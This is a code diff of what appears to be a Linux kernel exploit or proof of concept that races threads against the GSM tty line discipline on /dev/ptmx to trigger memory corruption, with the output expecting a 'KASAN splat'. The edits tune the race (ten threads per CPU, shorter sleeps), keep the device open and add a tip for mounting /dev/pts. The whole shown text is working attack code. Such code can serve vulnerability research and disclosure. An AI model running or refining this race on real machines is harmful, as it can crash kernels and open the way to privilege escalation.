@@ -159,35 +159,31 @@ void set_gsm_config(int dev_fd, u32 timeout_sec) {
 int open_tty_device(char *device) {
     LOG("[+][%.5d] Opening %s\n", gettid(), device);
     const int dev_fd = open(device, O_RDWR);
+
+    if(dev_fd == -1) {
+        LOG("[!] ptmx fd is -1... Did you mount /dev/pts?\n");
+        LOG("[!]   # mount proc -t proc /proc; mkdir /dev/pts; mount devpts -t devpts /dev/pts\n");
+        SYS(dev_fd);
+    }
+
     SYS(dev_fd);
     return dev_fd;
 }
 
 // set the GSM line discipline on given tty fd
 void set_tty_ldisc(int dev_fd, const int *ldisc) {
-    DBGLOG("[+] Setting GSM line discipline\n");
+    DBGLOG("[+] Setting line discipline\n");
     SYS(ioctl(dev_fd, TIOCSETD, ldisc));
 }
 
-int main(int argc, char **argv) {
-    char *device;
-    char default_tty[] = "/dev/ptmx";
-
-    // if /dev/ptmx isn't available (in a VM or whatever) then run with whatever term you 
-    // have access to -- i.e. /dev/tty1 should work :TM:
-    if (argc == 2) {
-        device = argv[1];
-    } else {
-        device = default_tty;
-    }
-
+int main() {
     NUM_CPU = (u8)get_nprocs();
     LOG("[+][%.5d] Found %u processors\n", gettid(), NUM_CPU);
 
     LOG("[+][%.5d] Setting main thread affinity to CPU 0\n", gettid());
     set_affinity(0);
 
-    int dev_fd = open_tty_device(device);
+    int dev_fd = open_tty_device("/dev/ptmx");
     LOG("[+][%.5d] Got device file descriptor: %d\n", gettid(), dev_fd);
 
     set_tty_ldisc(dev_fd, &gsm_ldisc);
@@ -197,14 +193,14 @@ int main(int argc, char **argv) {
     LOG("[+][%.5d] Config set\n", gettid());
 
     // for good luck :^)
-    sleep(3);
+    sleep(2);
 
     pthread_t _t;
     struct arg_data args = {
         .dev_fd = dev_fd,
     };
 
-    int n_threads = 10;
+    int n_threads = 10*NUM_CPU;
     LOG("[+][%.5d] Spawning %d threads\n", gettid(), n_threads);
     for(int i=0; i<n_threads; i++)
         pthread_create( &_t, 0, dlci_racer, (void*)&args );
@@ -215,18 +211,14 @@ int main(int argc, char **argv) {
     LOG("[+][%.5d] Starting threads\n", gettid());
     atomic_store_explicit(&start, true, memory_order_relaxed);
 
-    LOG("[+][%.5d] Waiting 3 seconds for threads to complete\n", gettid());
-    sleep(3);
+    LOG("[+][%.5d] Waiting 1 second for threads to complete\n", gettid());
+    sleep(1);
 
-    // while(atomic_load_explicit(&ready, memory_order_relaxed) != 0) { /* spinlock */ }
-
-    LOG("[+][%.5d] Closing device file descriptor to free gsm_mux\n", gettid());
-
-    close(dev_fd);
+    // LOG("[+][%.5d] Resetting line discipline to free gsm_mux\n", gettid());
+    // set_tty_ldisc(dev_fd, &ntty_ldisc);
+    // close(dev_fd);
 
     LOG("[+][%.5d] KASAN splat soon..? Sit tight for ~5/10 seconds! :)\n", gettid());
-
-    sleep(20);
 
     return 0;
 }
